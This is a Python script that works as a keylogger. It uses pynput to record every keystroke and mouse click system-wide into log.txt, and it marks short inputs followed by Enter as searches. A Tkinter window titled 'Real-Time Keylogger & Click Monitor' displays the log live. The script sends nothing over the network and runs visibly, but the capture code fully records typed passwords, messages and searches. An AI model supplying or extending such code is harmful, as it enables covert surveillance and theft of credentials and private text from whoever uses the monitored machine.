import tkinter as tk
from pynput.keyboard import Listener as KeyboardListener, Key, KeyCode
from pynput.mouse import Listener as MouseListener
import threading

buffer = ""
log_file = "log.txt"

numpad_map = {
    96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
    101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
    106: '*', 107: '+', 109: '-', 110: '.', 111: '/'
}

def writetofile(key):
    global buffer
    letter = ""

    if isinstance(key, KeyCode):
        if key.char is not None:
            letter = key.char
            buffer += letter
        elif key.vk in numpad_map:
            letter = numpad_map[key.vk]
            buffer += letter
        else:
            return
    else:
        letter = str(key).replace("'", "")
        if letter == "Key.space":
            letter = " "
            buffer += " "
        elif letter == "Key.backspace":
            try:
                with open(log_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                content = content[:-1]
                with open(log_file, 'w', encoding='utf-8') as f:
                    f.write(content)
                buffer = buffer[:-1]
            except FileNotFoundError:
                pass
            return
        elif letter == "Key.enter":
            if len(buffer.strip()) <= 3:
                letter = "\n[SEARCH ENTER]\n"
            else:
                letter = "\n[ENTER]\n"
            buffer = ""
        elif letter in ("Key.shift", "Key.shift_r"):
            return
        elif letter in ("Key.ctrl_l", "Key.ctrl_r"):
            letter = "[CTRL]"
        elif letter == "Key.tab":
            letter = "[TAB]"
        elif letter == "Key.esc":
            letter = "[ESC]"
        elif letter == "Key.alt_l":
            letter = "[ALT]"
        elif letter == "Key.alt_gr":
            letter = "[ALT GR]"
        elif letter == "Key.caps_lock":
            letter = "[CAPS LOCK]"
        elif letter == "Key.cmd":
            letter = "[COMMAND]"
        elif letter == "Key.delete":
            letter = "[DELETE]"
        elif letter == "Key.up":
            letter = "[UP ARROW]"
        elif letter == "Key.down":
            letter = "[DOWN ARROW]"
        elif letter == "Key.left":
            letter = "[LEFT ARROW]"
        elif letter == "Key.right":
            letter = "[RIGHT ARROW]"
        else:
            letter = "[" + letter.upper() + "]"

    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(letter)

def log_click(x, y, button, pressed):
    if pressed:
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f"\n[CLICK at ({x}, {y}) with {button}]\n")

def start_keylogger():
    with KeyboardListener(on_press=writetofile) as k_listener, MouseListener(on_click=log_click) as m_listener:
        k_listener.join()
        m_listener.join()

def run_logger_thread():
    threading.Thread(target=start_keylogger, daemon=True).start()

def create_gui():
    def update_log():
        try:
            with open(log_file, 'r', encoding='utf-8') as f:
                log_content = f.read()
            text_box.delete(1.0, tk.END)
            text_box.insert(tk.END, log_content)
        except FileNotFoundError:
            text_box.insert(tk.END, "Log file not found.")
        window.after(500, update_log)

    window = tk.Tk()
    window.title("Real-Time Keylogger & Click Monitor")
    window.geometry("500x400")

    text_box = tk.Text(window, wrap="word", font=("Consolas", 10))
    text_box.pack(expand=True, fill="both", padx=10, pady=10)

    update_log()
    window.mainloop()

run_logger_thread()
create_gui()
